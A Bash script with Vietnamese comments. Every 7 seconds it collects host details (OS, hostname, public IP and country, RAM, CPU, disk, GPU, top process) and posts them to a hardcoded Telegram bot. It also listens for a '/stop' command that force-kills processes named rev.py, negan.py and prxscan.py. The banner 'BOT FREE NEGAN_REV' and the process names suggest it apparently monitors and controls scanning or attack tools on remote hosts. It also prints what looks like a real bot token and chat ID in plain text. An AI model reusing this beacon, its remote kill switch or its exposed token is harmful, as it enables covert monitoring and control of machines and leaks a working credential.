#!/bin/bash

# Cấu hình Telegram
TELEGRAM_TOKEN="7828296793:AAEw4A7NI8tVrdrcR0TQZXyOpNSPbJmbGUU"
CHAT_ID="7371969470"
POLLING_INTERVAL=7
START_TIME=$(date +%s)
STOP_POLLING=false

# Hàm gửi tin nhắn
send_telegram_message() {
    local response=$(curl -s -w "%{http_code}" -o /dev/null -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" -d chat_id="$CHAT_ID" -d text="$1" -d parse_mode="HTML")
    [[ "$response" -ne 200 ]] && echo "Lỗi gửi tin nhắn: Mã $response"
}

# Bỏ qua lệnh cũ
ignore_previous_commands() {
    local last_update_id=$(curl -s "https://api.telegram.org/bot$TELEGRAM_TOKEN/getUpdates" | jq -r '.result[-1].update_id')
    [[ -n "$last_update_id" && "$last_update_id" != "null" ]] && curl -s "https://api.telegram.org/bot$TELEGRAM_TOKEN/getUpdates?offset=$((last_update_id + 1))&timeout=0" > /dev/null
}

# Kill tiến trình
strong_kill() {
    local processes=("rev.py" "negan.py" "prxscan.py" "start.sh" "monitor.sh" "setup.sh")
    for process in "${processes[@]}"; do
        pkill -9 -f "$process"
        for pid in $(pgrep -f "$process"); do pkill -9 -P "$pid"; done
        if pgrep -f "$process" >/dev/null; then send_telegram_message "Không thể kill $process"; else send_telegram_message "Đã kill $process thành công"; fi
    done
}

# Kiểm tra lệnh
check_telegram_command() {
    local updates=$(curl -s "https://api.telegram.org/bot$TELEGRAM_TOKEN/getUpdates")
    local update_id=$(echo "$updates" | jq -r '.result[-1].update_id')
    if [[ -n "$update_id" && "$update_id" != "null" ]]; then
        curl -s "https://api.telegram.org/bot$TELEGRAM_TOKEN/getUpdates?offset=$((update_id + 1))&timeout=0" > /dev/null
        if echo "$updates" | grep -q "/stop"; then
            send_telegram_message "Đang dừng giám sát..."
            STOP_POLLING=true
            strong_kill
            exit 0
        fi
    fi
}

# Tính thời gian hoạt động
get_uptime() {
    local uptime_seconds=$(( $(date +%s) - START_TIME ))
    echo "$((uptime_seconds / 86400))d $(( (uptime_seconds % 86400) / 3600 ))h $(( (uptime_seconds % 3600) / 60 ))m $((uptime_seconds % 60))s"
}

# Lấy thông tin hệ thống
get_system_info() {
    # Thông tin cơ bản
    local os_name=$(grep PRETTY_NAME /etc/os-release | cut -d'"' -f2)
    local hostname=$(hostname)
    local ip_address=$(curl -s ifconfig.me)
    local country=$(curl -s "http://ipinfo.io/$ip_address/country")
    [[ "$country" == *"Rate limit exceeded"* ]] && country="Block Limit"

    # Thông tin RAM
    read -r total_ram_kb used_ram_kb <<< $(free -k | awk '/Mem:/ {print $2, $3}')
    local ram_info="Tổng $(echo "scale=2; $total_ram_kb / 1048576" | bc)GB | Đã dùng $(echo "scale=2; $used_ram_kb / 1048576" | bc)GB ($(echo "scale=2; ($used_ram_kb / $total_ram_kb) * 100" | bc)%) | Trống $(echo "scale=2; 100 - ($used_ram_kb / $total_ram_kb) * 100" | bc)%"

    # Thông tin CPU
    local cpu_usage=$(top -bn1 | grep "Cpu(s)" | sed 's/.*, *\([0-9.]*\)%* id.*/\1/' | awk '{print 100 - $1}')
    local cpu_cores=$(lscpu | awk '/^CPU\(s\):/ {print $2}' 2>/dev/null || echo "?")
    local cpu_info="Sử dụng ${cpu_usage}% | Trống $(echo "scale=2; 100 - $cpu_usage" | bc)% | Cores: $cpu_cores (Dùng: $(echo "scale=2; $cpu_usage / 100 * $cpu_cores" | bc) | Trống: $(echo "scale=2; $cpu_cores - ($cpu_usage / 100 * $cpu_cores)" | bc))"

    # Thông tin khác
    local disk_usage=$(df -h / | awk 'NR==2 {print $3 "/" $2 " (" $5 " used)"}')
    local gpu_info=$(command -v lspci >/dev/null && lspci | grep -i 'vga\|3d\|2d\|scsi' | sed 's/^[^ ]* //;s/ (.*$//' | head -n 1 || echo "Không xác định")
    local top_process=$(ps -eo pid,comm,%mem,%cpu --sort=-%cpu | awk 'NR==2')
    local process_info="PID $(echo "$top_process" | awk '{print $1}') | Lệnh: $(echo "$top_process" | awk '{print $2}') | RAM: $(echo "$top_process" | awk '{print $3}')% | CPU: $(echo "$top_process" | awk '{print $4}')%"

    # Tạo message
    echo -e "🖥 Hệ điều hành BOT FREE NEGAN_REV: $os_name
📡 Hostname: $hostname
🌐 IP: $ip_address (Quốc gia: $country)
🏗 RAM: $ram_info
🧠 CPU: $cpu_info
🔍 Tiến trình tốn tài nguyên: $process_info
💾 Đĩa cứng: $disk_usage
🎮 GPU: $gpu_info
⏳ Uptime: $(uptime -p | sed 's/up //')
⏱ Bot Uptime: $(get_uptime)"
}

# Main
ignore_previous_commands
while true; do
    $STOP_POLLING && send_telegram_message "Đã dừng polling" && exit 0
    check_telegram_command
    system_info=$(get_system_info)
    send_telegram_message "$system_info"
    echo -e "$system_info\n----------------------------------------"
    sleep $POLLING_INTERVAL
done